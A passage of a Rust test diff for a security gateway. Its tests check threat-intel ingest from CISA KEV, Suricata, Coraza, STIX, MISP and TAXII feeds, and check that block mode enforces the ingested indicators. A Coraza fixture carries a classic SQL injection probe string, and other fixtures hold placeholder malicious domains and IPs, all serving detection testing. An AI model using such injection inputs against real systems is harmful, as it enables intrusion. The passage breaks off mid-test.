+        )
+        .await;
+        assert!(
+            audit_logs
+                .iter()
+                .any(|item| item.action == "import_kev_feed")
+        );
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        let owncloud = threat_entries
+            .iter()
+            .find(|entry| entry.value == "CVE-2023-49105")
+            .expect("ownCloud CVE upserted");
+        assert_eq!(owncloud.indicator_type, "cve");
+        assert_eq!(owncloud.severity, Severity::High);
+        assert_eq!(owncloud.source, "feed:cisa-kev");
+        let log4j = threat_entries
+            .iter()
+            .find(|entry| entry.value == "CVE-2021-44228")
+            .expect("Log4j CVE upserted");
+        assert_eq!(
+            log4j.severity,
+            Severity::Critical,
+            "ransomware-linked CVE escalates to critical"
+        );
+
+        let freshness: Vec<ThreatFeedFreshness> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/threat-feeds/freshness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            freshness
+                .iter()
+                .any(|feed| feed.feed_id == "cisa-kev-seoul" && !feed.stale)
+        );
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/threat-intel/cisa-kev")
+        );
+    }
+
+    #[tokio::test]
+    async fn kev_feed_import_requires_configured_write_credential() {
+        let app = build_app(
+            AppState::seeded(None).with_kev_catalog_url("http://127.0.0.1:9/kev.json".to_string()),
+        );
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/cisa-kev",
+                None,
+                &kev_import_request(),
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
+        let body = body_text(response).await;
+        assert!(body.contains("configured write-capable admin credential"));
+    }
+
+    #[tokio::test]
+    async fn kev_feed_import_rejects_redirected_feed_fetches() {
+        let target_feed = Router::new().route(
+            "/kev.json",
+            get(|| async {
+                (
+                    StatusCode::OK,
+                    r#"{"vulnerabilities":[{"cveID":"CVE-2024-0001"}]}"#,
+                )
+            }),
+        );
+        let target_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let target_addr = target_listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(target_listener, target_feed).into_future());
+
+        let redirect_target = format!("http://{target_addr}/kev.json");
+        let redirect_feed = Router::new().route(
+            "/kev.json",
+            get(move || {
+                let location = redirect_target.clone();
+                async move { (StatusCode::FOUND, [("location", location)]) }
+            }),
+        );
+        let redirect_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let redirect_addr = redirect_listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(redirect_listener, redirect_feed).into_future());
+
+        let app = build_app(
+            AppState::seeded(Some("secret".to_string()))
+                .with_kev_catalog_url(format!("http://{redirect_addr}/kev.json")),
+        );
+        let payload = kev_import_request();
+
+        let response = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/cisa-kev",
+                Some("secret"),
+                &payload,
+            ),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::BAD_GATEWAY);
+    }
+
+    #[test]
+    fn validate_kev_import_request_checks_feed_metadata_only() {
+        // The request no longer carries a URL at all (see import_kev_feed:
+        // it always fetches AppState::kev_catalog_url, server-side config
+        // only), so validation is limited to the feed metadata fields.
+        assert!(validate_kev_import_request(&kev_import_request()).is_ok());
+
+        let blank_feed_id = KevImportRequest {
+            feed_id: "  ".to_string(),
+            ..kev_import_request()
+        };
+        assert!(validate_kev_import_request(&blank_feed_id).is_err());
+
+        let blank_source = KevImportRequest {
+            source: "".to_string(),
+            ..kev_import_request()
+        };
+        assert!(validate_kev_import_request(&blank_source).is_err());
+
+        let zero_ttl = KevImportRequest {
+            ttl_seconds: 0,
+            ..kev_import_request()
+        };
+        assert!(validate_kev_import_request(&zero_ttl).is_err());
+    }
+
+    #[tokio::test]
+    async fn kev_cve_indicators_never_block_legitimate_requests() {
+        // A CVE identifier tracked from a KEV import is vulnerability
+        // metadata, not a request-content attack signature. A legitimate
+        // request that happens to reference a cataloged CVE (e.g. a
+        // vulnerability-management dashboard proxied through the gateway)
+        // must not be blocked just because the identifier appears in it.
+        let feed_mock = Router::new().route(
+            "/kev.json",
+            get(|| async {
+                (
+                    StatusCode::OK,
+                    r#"{"vulnerabilities":[{"cveID":"CVE-2021-44228","knownRansomwareCampaignUse":"Known"}]}"#,
+                )
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(listener, feed_mock).into_future());
+
+        let app = build_app(
+            AppState::seeded(Some("secret".to_string()))
+                .with_kev_catalog_url(format!("http://{addr}/kev.json")),
+        );
+        let payload = kev_import_request();
+        let imported = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/cisa-kev",
+                Some("secret"),
+                &payload,
+            ),
+        )
+        .await;
+        assert_eq!(imported.status(), StatusCode::CREATED);
+
+        let block_route = RouteConfig {
+            id: "cve-lookup".to_string(),
+            path_prefix: "/cve-lookup".to_string(),
+            upstream: "mock://cve-lookup".to_string(),
+            mode: EnforcementMode::Block,
+            enabled: true,
+            block_threshold: None,
+        };
+        let route_response = app_request(
+            &app,
+            json_request(Method::POST, "/api/routes", Some("secret"), &block_route),
+        )
+        .await;
+        assert_eq!(route_response.status(), StatusCode::CREATED);
+
+        let allowed = app_request(
+            &app,
+            empty_request(Method::GET, "/gateway/cve-lookup?id=CVE-2021-44228"),
+        )
+        .await;
+        assert_eq!(allowed.status(), StatusCode::OK);
+    }
+
+    #[tokio::test]
+    async fn kev_feed_refresh_removes_withdrawn_cves() {
+        let initial_catalog = serde_json::json!({
+            "vulnerabilities": [
+                {"cveID": "CVE-2023-49105", "knownRansomwareCampaignUse": "Unknown"},
+                {"cveID": "CVE-2021-44228", "knownRansomwareCampaignUse": "Known"}
+            ]
+        });
+        let refreshed_catalog = serde_json::json!({
+            "vulnerabilities": [
+                {"cveID": "CVE-2023-49105", "knownRansomwareCampaignUse": "Unknown"}
+            ]
+        });
+        let catalogs = Arc::new(Mutex::new(vec![
+            initial_catalog.to_string(),
+            refreshed_catalog.to_string(),
+        ]));
+        let feed_mock = Router::new().route(
+            "/kev.json",
+            get(move || {
+                let catalogs = catalogs.clone();
+                async move {
+                    let body = catalogs.lock().await.remove(0);
+                    (StatusCode::OK, body)
+                }
+            }),
+        );
+        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
+        let addr = listener.local_addr().unwrap();
+        tokio::spawn(axum::serve(listener, feed_mock).into_future());
+
+        let app = build_app(
+            AppState::seeded(Some("secret".to_string()))
+                .with_kev_catalog_url(format!("http://{addr}/kev.json")),
+        );
+        let payload = kev_import_request();
+
+        let first_import = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/cisa-kev",
+                Some("secret"),
+                &payload,
+            ),
+        )
+        .await;
+        assert_eq!(first_import.status(), StatusCode::CREATED);
+
+        let second_import = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-intel/cisa-kev",
+                Some("secret"),
+                &payload,
+            ),
+        )
+        .await;
+        assert_eq!(second_import.status(), StatusCode::CREATED);
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threat_entries
+                .iter()
+                .any(|entry| entry.value == "CVE-2023-49105")
+        );
+        assert!(
+            threat_entries
+                .iter()
+                .all(|entry| entry.value != "CVE-2021-44228"),
+            "withdrawn CVEs should be removed on refresh"
+        );
+    }
+
+    #[tokio::test]
+    async fn feed_refresh_preserves_indicators_still_owned_by_another_feed() {
+        // Two independently-managed feeds can legitimately report the same
+        // indicator_type+value+source. Refreshing one feed without it must
+        // not delete it while the other feed still claims it.
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let shared = ThreatIndicator {
+            value: "198.51.100.77".to_string(),
+            indicator_type: "ip".to_string(),
+            severity: Severity::High,
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+        };
+        let feed_a = ThreatFeedImport {
+            feed_id: "feed-a".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+            threats: vec![shared.clone()],
+            dnsbl: Vec::new(),
+        };
+        let feed_b = ThreatFeedImport {
+            feed_id: "feed-b".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+            threats: vec![shared.clone()],
+            dnsbl: Vec::new(),
+        };
+        for feed in [&feed_a, &feed_b] {
+            let imported = app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/threat-feeds/import",
+                    Some("secret"),
+                    feed,
+                ),
+            )
+            .await;
+            assert_eq!(imported.status(), StatusCode::CREATED);
+        }
+
+        // validate_threat_feed_import requires at least one threat or DNSBL
+        // entry, so refreshes carry an unrelated DNSBL row to stay valid
+        // while genuinely dropping the shared indicator from `threats`.
+        let placeholder_dnsbl = DnsblEntry {
+            address: "203.0.113.9".parse().unwrap(),
+            code: "127.0.0.5".to_string(),
+            reason: "refresh placeholder".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+            prefix_len: None,
+        };
+
+        // Feed A refreshes and drops the shared indicator; feed B still owns it.
+        let feed_a_refresh = ThreatFeedImport {
+            threats: Vec::new(),
+            dnsbl: vec![placeholder_dnsbl.clone()],
+            ..feed_a.clone()
+        };
+        let refreshed = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &feed_a_refresh,
+            ),
+        )
+        .await;
+        assert_eq!(refreshed.status(), StatusCode::CREATED);
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threat_entries
+                .iter()
+                .any(|entry| entry.value == shared.value),
+            "an indicator still owned by feed-b must survive feed-a's refresh"
+        );
+
+        // Feed B now also drops it -- no feed owns it any more, so it's reaped.
+        let feed_b_refresh = ThreatFeedImport {
+            threats: Vec::new(),
+            dnsbl: vec![placeholder_dnsbl],
+            ..feed_b.clone()
+        };
+        let refreshed = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &feed_b_refresh,
+            ),
+        )
+        .await;
+        assert_eq!(refreshed.status(), StatusCode::CREATED);
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threat_entries
+                .iter()
+                .all(|entry| entry.value != shared.value),
+            "an indicator no feed owns any more should be reaped"
+        );
+    }
+
+    #[tokio::test]
+    async fn feed_refresh_preserves_indicators_independently_upserted_by_operator() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let shared = ThreatIndicator {
+            value: "198.51.100.88".to_string(),
+            indicator_type: "ip".to_string(),
+            severity: Severity::High,
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+        };
+        let feed = ThreatFeedImport {
+            feed_id: "feed-a".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+            threats: vec![shared.clone()],
+            dnsbl: Vec::new(),
+        };
+        let imported = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &feed,
+            ),
+        )
+        .await;
+        assert_eq!(imported.status(), StatusCode::CREATED);
+
+        let operator_upsert = app_request(
+            &app,
+            json_request(Method::POST, "/api/threats", Some("secret"), &shared),
+        )
+        .await;
+        assert_eq!(operator_upsert.status(), StatusCode::CREATED);
+
+        let placeholder_dnsbl = DnsblEntry {
+            address: "203.0.113.10".parse().unwrap(),
+            code: "127.0.0.5".to_string(),
+            reason: "refresh placeholder".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 600,
+            prefix_len: None,
+        };
+        let refresh = ThreatFeedImport {
+            threats: Vec::new(),
+            dnsbl: vec![placeholder_dnsbl],
+            ..feed
+        };
+        let refreshed = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &refresh,
+            ),
+        )
+        .await;
+        assert_eq!(refreshed.status(), StatusCode::CREATED);
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threat_entries
+                .iter()
+                .any(|entry| entry.value == shared.value),
+            "operator-managed indicator must survive feed withdrawal"
+        );
+    }
+
+    #[tokio::test]
+    async fn feed_refresh_preserves_operator_managed_indicator_payload() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let operator_indicator = ThreatIndicator {
+            value: "198.51.100.89".to_string(),
+            indicator_type: "ip".to_string(),
+            severity: Severity::Critical,
+            source: "shared-source".to_string(),
+            ttl_seconds: 86_400,
+        };
+        let created = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threats",
+                Some("secret"),
+                &operator_indicator,
+            ),
+        )
+        .await;
+        assert_eq!(created.status(), StatusCode::CREATED);
+
+        let feed = ThreatFeedImport {
+            feed_id: "feed-a".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 60,
+            threats: vec![ThreatIndicator {
+                severity: Severity::Low,
+                ttl_seconds: 60,
+                ..operator_indicator.clone()
+            }],
+            dnsbl: Vec::new(),
+        };
+        let imported = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &feed,
+            ),
+        )
+        .await;
+        assert_eq!(imported.status(), StatusCode::CREATED);
+
+        let refresh = ThreatFeedImport {
+            threats: Vec::new(),
+            dnsbl: vec![DnsblEntry {
+                address: "203.0.113.19".parse().unwrap(),
+                code: "127.0.0.19".to_string(),
+                reason: "refresh placeholder".to_string(),
+                source: "shared-source".to_string(),
+                ttl_seconds: 60,
+                prefix_len: None,
+            }],
+            ..feed
+        };
+        let refreshed = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threat-feeds/import",
+                Some("secret"),
+                &refresh,
+            ),
+        )
+        .await;
+        assert_eq!(refreshed.status(), StatusCode::CREATED);
+
+        let threat_entries: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        let stored = threat_entries
+            .iter()
+            .find(|entry| {
+                entry.value == operator_indicator.value
+                    && entry.indicator_type == operator_indicator.indicator_type
+                    && entry.source == operator_indicator.source
+            })
+            .expect("operator-managed indicator should remain present");
+        assert_eq!(stored.severity, Severity::Critical);
+        assert_eq!(stored.ttl_seconds, 86_400);
+    }
+
+    #[tokio::test]
+    async fn import_result_excludes_operator_owned_threats_from_upserted_count() {
+        // apply_threat_feed_import skips upserting threats whose key is
+        // operator-owned (see feed_refresh_preserves_operator_managed_indicator_payload),
+        // so the reported upserted_threats count must reflect what was
+        // actually applied, not the feed's full submitted set.
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let operator_indicator = ThreatIndicator {
+            value: "198.51.100.90".to_string(),
+            indicator_type: "ip".to_string(),
+            severity: Severity::Critical,
+            source: "shared-source".to_string(),
+            ttl_seconds: 86_400,
+        };
+        let created = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/threats",
+                Some("secret"),
+                &operator_indicator,
+            ),
+        )
+        .await;
+        assert_eq!(created.status(), StatusCode::CREATED);
+
+        let feed = ThreatFeedImport {
+            feed_id: "feed-b".to_string(),
+            source: "shared-source".to_string(),
+            ttl_seconds: 60,
+            threats: vec![
+                ThreatIndicator {
+                    severity: Severity::Low,
+                    ttl_seconds: 60,
+                    ..operator_indicator.clone()
+                },
+                ThreatIndicator {
+                    value: "198.51.100.91".to_string(),
+                    indicator_type: "ip".to_string(),
+                    severity: Severity::Low,
+                    source: "shared-source".to_string(),
+                    ttl_seconds: 60,
+                },
+            ],
+            dnsbl: Vec::new(),
+        };
+        let import_result: ThreatFeedImportResult = json_body(
+            app_request(
+                &app,
+                json_request(
+                    Method::POST,
+                    "/api/threat-feeds/import",
+                    Some("secret"),
+                    &feed,
+                ),
+            )
+            .await,
+        )
+        .await;
+        assert_eq!(
+            import_result.upserted_threats, 1,
+            "only the non-operator-owned threat should count as upserted"
+        );
+    }
+
+    #[tokio::test]
+    async fn suricata_eve_ingest_maps_alerts_to_security_events() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let unauthorized = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/ids/suricata/eve")
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    r#"{"event_type":"alert","src_ip":"203.0.113.50","alert":{"signature":"x","severity":1}}"#,
+                ))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let ndjson = r#"
+{"event_type":"stats"}
+{"event_type":"alert","src_ip":"203.0.113.50","dest_ip":"198.51.100.1","dest_port":80,"alert":{"signature":"ET WEB_SERVER SQLi","category":"Web Application Attack","severity":1},"http":{"url":"/x?id=1"}}
+"#;
+        let response = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/ids/suricata/eve")
+                .header("content-type", "application/x-ndjson")
+                .header("x-admin-token", "secret")
+                .body(Body::from(ndjson))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::CREATED);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["accepted_alerts"], 1);
+        assert_eq!(body["skipped_non_alerts"], 1);
+        assert_eq!(body["event_ids"].as_array().unwrap().len(), 1);
+
+        let events: Vec<SecurityEvent> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/events")).await).await;
+        let ingested = events
+            .iter()
+            .find(|e| e.reason.contains("ET WEB_SERVER SQLi"))
+            .expect("suricata alert event");
+        assert_eq!(ingested.action, "block");
+        assert_eq!(ingested.score, 80);
+        assert_eq!(ingested.path, "/x?id=1");
+        assert_eq!(ingested.client_ip, Some("203.0.113.50".parse().unwrap()));
+
+        let audit: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                Request::builder()
+                    .method(Method::GET)
+                    .uri("/api/audit-logs")
+                    .header("x-admin-token", "secret")
+                    .body(Body::empty())
+                    .unwrap(),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            audit
+                .iter()
+                .any(|entry| entry.action == "import_suricata_eve")
+        );
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/ids/suricata/eve")
+        );
+    }
+
+    #[tokio::test]
+    async fn coraza_audit_ingest_maps_crs_hits_to_security_events() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let unauthorized = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/waf/coraza/audit")
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    r#"{"transaction":{"is_interrupted":true,"request":{"uri":"/"},"response":{"http_code":403}},"messages":[{"message":"x","data":{"id":1,"severity":2}}]}"#,
+                ))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let audit_json = r#"{
+          "transaction": {
+            "client_ip": "203.0.113.77",
+            "time_stamp": "2024-06-15T12:34:56+0000",
+            "is_interrupted": true,
+            "request": { "uri": "/search?q=1'+OR+1=1" },
+            "response": { "http_code": 403 }
+          },
+          "messages": [
+            {
+              "message": "SQL Injection Attack Detected via libinjection",
+              "data": { "id": 942100, "severity": 2 }
+            }
+          ]
+        }"#;
+        let response = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/waf/coraza/audit")
+                .header("content-type", "application/json")
+                .header("x-admin-token", "secret")
+                .body(Body::from(audit_json))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::CREATED);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["accepted_hits"], 1);
+        assert_eq!(body["event_ids"].as_array().unwrap().len(), 1);
+        assert!(body["enforcement_hints"].as_u64().unwrap() >= 1);
+
+        let events: Vec<SecurityEvent> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/events")).await).await;
+        let ingested = events
+            .iter()
+            .find(|e| e.reason.contains("942100"))
+            .expect("coraza crs event");
+        assert_eq!(ingested.action, "block");
+        assert_eq!(ingested.path, "/search?q=1'+OR+1=1");
+        assert_eq!(ingested.client_ip, Some("203.0.113.77".parse().unwrap()));
+        assert_eq!(ingested.timestamp_unix, 1_718_454_896);
+
+        // Engine hit feeds DNSBL + client_ip indicators so gateway block mode enforces.
+        let route_resp = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("secret"),
+                &serde_json::json!({
+                    "id": "search-block",
+                    "path_prefix": "/search",
+                    "upstream": "mock://x",
+                    "mode": "block",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(route_resp.status(), StatusCode::CREATED);
+        let blocked = app_request(
+            &app,
+            gateway_get_from_ip("/gateway/search?q=1", "203.0.113.77"),
+        )
+        .await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+        let allowed = app_request(
+            &app,
+            gateway_get_from_ip("/gateway/search?q=1", "198.51.100.9"),
+        )
+        .await;
+        assert_ne!(allowed.status(), StatusCode::FORBIDDEN);
+
+        let audit: Vec<AuditLogEntry> = json_body(
+            app_request(
+                &app,
+                authed_empty_request(Method::GET, "/api/audit-logs", "secret"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            audit
+                .iter()
+                .any(|entry| entry.action == "import_coraza_audit")
+        );
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/waf/coraza/audit")
+        );
+    }
+
+    #[tokio::test]
+    async fn stix_indicator_ingest_updates_threats_dnsbl_and_feed_freshness() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let unauthorized = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/threat-intel/stix")
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    r#"{"type":"indicator","pattern":"[ipv4-addr:value = '1.2.3.4']"}"#,
+                ))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let bundle = r#"{
+          "type": "bundle",
+          "id": "bundle--aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa",
+          "objects": [
+            {
+              "type": "indicator",
+              "id": "indicator--bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb",
+              "name": "bad-ip",
+              "pattern": "[ipv4-addr:value = '203.0.113.88']",
+              "pattern_type": "stix",
+              "valid_from": "2024-01-01T00:00:00Z",
+              "confidence": 90
+            },
+            {
+              "type": "indicator",
+              "id": "indicator--cccccccc-cccc-4ccc-8ccc-cccccccccccc",
+              "name": "bad-domain",
+              "pattern": "[domain-name:value = 'phish.example']",
+              "pattern_type": "stix",
+              "valid_from": "2024-01-01T00:00:00Z",
+              "confidence": 70
+            }
+          ]
+        }"#;
+        let response = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/threat-intel/stix?feed_id=stix-lab&source=stix:lab&ttl_seconds=3600")
+                .header("content-type", "application/json")
+                .header("x-admin-token", "secret")
+                .body(Body::from(bundle))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::CREATED);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["feed_id"], "stix-lab");
+        assert!(body["upserted_threats"].as_u64().unwrap() >= 2);
+        assert_eq!(body["upserted_dnsbl"], 1);
+
+        let threats: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "phish.example" && t.indicator_type == "domain")
+        );
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "203.0.113.88" && t.indicator_type == "client_ip")
+        );
+
+        let dnsbl: Vec<DnsblEntry> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/dnsbl")).await).await;
+        assert!(
+            dnsbl
+                .iter()
+                .any(|d| d.address.to_string() == "203.0.113.88")
+        );
+
+        let freshness: Vec<ThreatFeedFreshness> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/threat-feeds/freshness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            freshness
+                .iter()
+                .any(|f| f.feed_id == "stix-lab" && !f.stale)
+        );
+
+        let route_resp = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("secret"),
+                &serde_json::json!({
+                    "id": "stix-block",
+                    "path_prefix": "/stix",
+                    "upstream": "mock://x",
+                    "mode": "block",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(route_resp.status(), StatusCode::CREATED);
+        let blocked = app_request(&app, gateway_get_from_ip("/gateway/stix", "203.0.113.88")).await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/threat-intel/stix")
+        );
+    }
+
+    #[tokio::test]
+    async fn misp_event_ingest_updates_threats_dnsbl_and_feed_freshness() {
+        let app = build_app(AppState::seeded(Some("secret".to_string())));
+        let unauthorized = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/threat-intel/misp")
+                .header("content-type", "application/json")
+                .body(Body::from(
+                    r#"{"Event":{"Attribute":[{"type":"ip-dst","value":"1.2.3.4","to_ids":true}]}}"#,
+                ))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(unauthorized.status(), StatusCode::UNAUTHORIZED);
+
+        let event = r#"{
+          "Event": {
+            "id": "99",
+            "info": "buyer-lab misp sample",
+            "threat_level_id": "1",
+            "Attribute": [
+              {
+                "type": "ip-dst",
+                "value": "203.0.113.91",
+                "to_ids": true,
+                "comment": "scanner"
+              },
+              {
+                "type": "domain",
+                "value": "misp-evil.example",
+                "to_ids": true
+              },
+              {
+                "type": "url",
+                "value": "http://misp-evil.example/phish",
+                "to_ids": true
+              },
+              {
+                "type": "comment",
+                "value": "ignored",
+                "to_ids": true
+              }
+            ]
+          }
+        }"#;
+        let response = app_request(
+            &app,
+            Request::builder()
+                .method(Method::POST)
+                .uri("/api/threat-intel/misp?feed_id=misp-lab&source=misp:lab&ttl_seconds=3600")
+                .header("content-type", "application/json")
+                .header("x-admin-token", "secret")
+                .body(Body::from(event))
+                .unwrap(),
+        )
+        .await;
+        assert_eq!(response.status(), StatusCode::CREATED);
+        let body: serde_json::Value = json_body(response).await;
+        assert_eq!(body["feed_id"], "misp-lab");
+        assert!(body["upserted_threats"].as_u64().unwrap() >= 2);
+        assert_eq!(body["upserted_dnsbl"], 1);
+        assert!(body["skipped_attributes"].as_u64().unwrap() >= 1);
+
+        let threats: Vec<ThreatIndicator> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/threats")).await).await;
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "misp-evil.example" && t.indicator_type == "domain")
+        );
+        assert!(
+            threats
+                .iter()
+                .any(|t| t.value == "203.0.113.91" && t.indicator_type == "client_ip")
+        );
+
+        let dnsbl: Vec<DnsblEntry> =
+            json_body(app_request(&app, empty_request(Method::GET, "/api/dnsbl")).await).await;
+        assert!(
+            dnsbl
+                .iter()
+                .any(|d| d.address.to_string() == "203.0.113.91")
+        );
+
+        let freshness: Vec<ThreatFeedFreshness> = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/threat-feeds/freshness"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            freshness
+                .iter()
+                .any(|f| f.feed_id == "misp-lab" && !f.stale)
+        );
+
+        let route_resp = app_request(
+            &app,
+            json_request(
+                Method::POST,
+                "/api/routes",
+                Some("secret"),
+                &serde_json::json!({
+                    "id": "misp-block",
+                    "path_prefix": "/misp",
+                    "upstream": "mock://x",
+                    "mode": "block",
+                    "enabled": true
+                }),
+            ),
+        )
+        .await;
+        assert_eq!(route_resp.status(), StatusCode::CREATED);
+        let blocked = app_request(&app, gateway_get_from_ip("/gateway/misp", "203.0.113.91")).await;
+        assert_eq!(blocked.status(), StatusCode::FORBIDDEN);
+
+        let manifest: BuyerEvidenceManifest = json_body(
+            app_request(
+                &app,
+                empty_request(Method::GET, "/api/commercial/evidence-manifest"),
+            )
+            .await,
+        )
+        .await;
+        assert!(
+            manifest
+                .required_endpoints
+                .iter()
+                .any(|endpoint| endpoint.path == "/api/threat-intel/misp")
+        );
+    }
+
+    #[tokio::test]
+    async fn taxii_collection_poll_imports_stix_and_blocks_gateway() {
+        let taxii_body = r#"{
+          "more": false,
+          "objects": [
+            {
+              "type": "indicator",
+              "id": "indicator--dddddddd-dddd-4ddd-8ddd-dddddddddddd",
+              "name": "taxii-bad-ip",
+              "pattern": "[ipv4-addr:value = '203.0.113.92']",
+              "pattern_type": "stix",
+              "valid_from": "2024-01-01T00:00:00Z",
+              "confidence": 90
+            },
